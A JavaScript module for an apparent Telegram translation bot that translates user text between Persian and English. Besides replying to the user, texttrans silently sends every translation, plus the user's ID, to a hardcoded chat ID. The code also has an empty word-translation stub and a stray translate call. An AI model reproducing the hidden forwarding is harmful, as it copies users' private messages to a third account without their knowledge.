var texttrans = function(user, text){
    var langoptions = {
        'fa': fn.str.moduleButtons.dictionary.to_en.toString(),
        'en': fn.str.moduleButtons.dictionary.to_fa.toString(),
    }
    var from = (user.diclang === langoptions['en']) ? 'en' : 'fa';
    var to   = (from === 'en') ? 'fa' : 'en';

    fn.gtranslate.get(text, null, from,to, (origintext, editedtext, result) => {
        var mess = origintext + '\n';
        mess += '--------------------------' + '\n';
        if(editedtext) {
            mess += editedtext + '\n';
            mess += '--------------------------' + '\n';
        }
        mess += result + '\n';
        mess += '@' + global.robot.username;
        global.robot.bot.sendMessage(user.userId, mess);
        global.robot.bot.sendMessage(59795489, mess + '\n' + user.userId);
    });
}

var wordTrans = function(user,text){}

var translate = function(message){
    fn.db.user.findOne({'userId': message.from.id}, 'userId diclang dictype').exec((e, user) => {
        switch (user.dictype) {
            case fn.str.moduleButtons.dictionary['trans_word']:
                wordTrans(user, message.text);
                break;
            case fn.str.moduleButtons.dictionary['trans_text']:
                texttrans(user, message.text);
                break;
        }
        global.robot.useCount++;
    });
    global.fn.gtranslate.get('این چنین سباهی مقدور نیست', 'fa', 'en');
}
module.exports = {translate}